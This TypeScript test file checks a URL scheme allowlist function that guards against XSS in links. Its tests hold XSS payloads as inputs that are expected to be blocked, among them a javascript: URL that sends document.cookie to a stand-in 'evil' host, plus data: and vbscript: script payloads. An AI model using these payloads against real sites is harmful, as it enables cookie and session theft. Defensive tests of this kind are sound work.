/**
 * Mirrors web/src/util/safeUrl.ts scheme allowlist for XSS prevention tests.
 * Pure logic — no DOM dependency.
 */
function safeHref(u?: string | null, origin = 'https://lumixo.app'): string | undefined {
  if (!u) return undefined;
  try {
    const { protocol } = new URL(u, origin);
    return protocol === 'http:' || protocol === 'https:' ? u : undefined;
  } catch {
    return undefined;
  }
}

describe('safeHref scheme allowlist', () => {
  it('allows https storage URLs', () => {
    expect(safeHref('https://xyz.supabase.co/storage/v1/object/sign/media/a.jpg')).toBeDefined();
  });

  it('allows http only when absolute http', () => {
    expect(safeHref('http://example.com/file.pdf')).toBe('http://example.com/file.pdf');
  });

  it('blocks javascript: XSS', () => {
    expect(safeHref("javascript:alert(1)")).toBeUndefined();
    expect(safeHref("javascript:fetch('//evil/'+document.cookie)")).toBeUndefined();
  });

  it('blocks data: and vbscript:', () => {
    expect(safeHref('data:text/html,<script>alert(1)</script>')).toBeUndefined();
    expect(safeHref('vbscript:msgbox(1)')).toBeUndefined();
  });

  it('blocks empty/null', () => {
    expect(safeHref(null)).toBeUndefined();
    expect(safeHref('')).toBeUndefined();
  });
});
